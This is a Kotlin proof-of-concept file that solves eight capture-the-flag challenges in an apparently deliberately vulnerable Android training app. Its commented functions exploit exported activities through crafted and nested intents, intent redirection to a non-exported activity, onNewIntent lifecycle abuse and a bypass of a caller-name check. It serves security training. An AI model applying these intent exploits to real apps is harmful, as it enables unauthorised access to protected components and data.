package com.vishal2376.hextreepoc

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import androidx.core.net.toUri

/**
 * Author: Vishal Singh (vishal2376)
 *
 * Android Attack Surface POC
 * Techniques used to exploit exported activities of target app.
 */

class Attack(private val context: Context, private val activity: HextreeActivity) {

	private val packageName = "io.hextree.attacksurface"

	/**
	 * FLAG 1 - Direct Activity Launch
	 * Technique: Explicit Intent
	 * Simply launch an exported activity directly using setClassName().
	 * Works when activity has android:exported="true" with no extra conditions.
	 */
	fun flag1() {
		val activityPath = "io.hextree.attacksurface.activities.Flag1Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		Utils.dumpIntent(context, intent, title = "Flag 1 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 2 - Custom Action Intent
	 * Technique: Intent Action Matching
	 * Target activity checks intent action before proceeding.
	 * We set the exact action string the activity expects to pass its condition.
	 */
	fun flag2() {
		val activityPath = "io.hextree.attacksurface.activities.Flag2Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = "io.hextree.action.GIVE_FLAG"
		Utils.dumpIntent(context, intent, title = "Flag 2 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 3 - Action + URI Data
	 * Technique: Intent Action + Data URI
	 * Target activity validates both action and data URI.
	 * We craft an intent with the exact action and URI it expects.
	 */
	fun flag3() {
		val activityPath = "io.hextree.attacksurface.activities.Flag3Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = "io.hextree.action.GIVE_FLAG"
		intent.data = "https://app.hextree.io/map/android".toUri()
		Utils.dumpIntent(context, intent, title = "Flag 3 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 4 - State Machine Exploitation
	 * Technique: Sequential Intent Sending
	 * Target activity implements a state machine (INIT→PREPARE→BUILD→GET_FLAG→success).
	 * We send intents in correct order with matching actions to advance each state.
	 * Delay between intents ensures each state transition completes before next.
	 */
	fun flag4() {
		val activityPath = "$packageName.activities.Flag4Activity"

		val customActions = listOf(
			"PREPARE_ACTION",   // INIT -> PREPARE
			"BUILD_ACTION",     // PREPARE -> BUILD
			"GET_FLAG_ACTION",  // BUILD -> GET_FLAG
			null                // GET_FLAG -> success() (auto triggers on any intent)
		)

		customActions.forEachIndexed { i, action ->
			val intent = Intent()
			intent.setClassName(packageName, activityPath)
			intent.action = action
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

			Handler(Looper.getMainLooper()).postDelayed({
				Utils.dumpIntent(context, intent, title = "Flag 4 Intent $i")
				context.startActivity(intent)
			}, i * 500L)
		}
	}

	/**
	 * FLAG 5 - Nested Intent (Intent in Intent)
	 * Technique: Intent Extras Nesting
	 * Target activity extracts an inner intent from extras key "android.intent.extra.INTENT".
	 * Inner intent must have return=42 and a nextIntent with reason="back" to trigger success().
	 * We craft a 3-level nested intent structure to satisfy all conditions.
	 */
	fun flag5() {
		val activityPath = "$packageName.activities.Flag5Activity"

		// Level 3: nextIntent with reason="back" triggers success() directly
		val intent3 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("reason", "back")
		}

		// Level 2: inner intent with return=42 and nextIntent attached
		val intent2 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("return", 42)
			putExtra("nextIntent", intent3)
		}

		// Level 1: outer intent wrapping inner intent in standard extra key
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("android.intent.extra.INTENT", intent2)
		}

		Utils.dumpIntent(context, intent, title = "Flag 5 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 6 - Intent Redirect to Non-Exported Activity
	 * Technique: Intent Redirection via Exported Activity
	 * Flag6Activity is NOT exported — cannot be launched directly.
	 * Flag5Activity is exported and forwards nextIntent via startActivity().
	 * We abuse Flag5 as a launchpad to reach Flag6 indirectly.
	 * FLAG_GRANT_READ_URI_PERMISSION (flag=0x1) is required by Flag6 to call success().
	 * reason="next" tells Flag5 to call startActivity(nextIntent) instead of success() itself.
	 */
	fun flag6() {
		val activityPath = "$packageName.activities.Flag5Activity"
		val newActivityPath = "$packageName.activities.Flag6Activity"

		// Target: Flag6Activity with required flag set
		val intent3 = Intent().apply {
			setClassName(packageName, newActivityPath)
			putExtra("reason", "next")
			flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
		}

		// Inner intent satisfying Flag5's conditions, carrying nextIntent
		val intent2 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("return", 42)
			putExtra("nextIntent", intent3)
		}

		// Outer intent to exported Flag5Activity (launchpad)
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("android.intent.extra.INTENT", intent2)
			flags = Intent.FLAG_ACTIVITY_NEW_TASK
		}

		Utils.dumpIntent(context, intent, title = "Flag 6 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 7 - onNewIntent() Lifecycle Exploitation
	 * Technique: Activity Lifecycle Abuse via FLAG_ACTIVITY_SINGLE_TOP
	 * Target activity checks action="OPEN" in onCreate() and action="REOPEN" in onNewIntent().
	 * onNewIntent() is only called when activity is already running and receives a new intent.
	 * Step 1: Launch activity with action="OPEN" to initialize it.
	 * Step 2: Send second intent with action="REOPEN" + FLAG_ACTIVITY_SINGLE_TOP
	 *         so Android routes it to onNewIntent() instead of creating new instance.
	 * Delay ensures activity is fully created before second intent arrives.
	 */
	fun flag7() {
		val activityPath = "$packageName.activities.Flag7Activity"

		// Step 1: Launch and initialize activity
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			action = "OPEN"
			flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
		}
		context.startActivity(intent)

		// Step 2: Trigger onNewIntent() after activity is created
		Handler(Looper.getMainLooper()).postDelayed({
			val newIntent = Intent().apply {
				setClassName(packageName, activityPath)
				action = "REOPEN"
				flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
			}
			context.startActivity(newIntent)
		}, 500)
	}

	/**
	 * FLAG 8 - Caller Identity Verification Bypass
	 * Technique: startActivityForResult + Caller Class Name Spoofing
	 * Target activity uses getCallingActivity() to verify the caller's class name.
	 * getCallingActivity() only returns a value when started via startActivityForResult().
	 * It checks if caller class name contains "Hextree" before calling success().
	 * We use HextreeActivity (which contains "Hextree" in name) to call startActivityForResult()
	 * so getCallingActivity() returns "HextreeActivity" → condition passes → success().
	 */
	fun flag8() {
		val activityPath = "$packageName.activities.Flag8Activity"

		// Launch Flag8 via startActivityForResult from HextreeActivity
		// so getCallingActivity() = "HextreeActivity" contains "Hextree"
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
		}
		activity.startActivityForResult(intent, 8)
	}
}
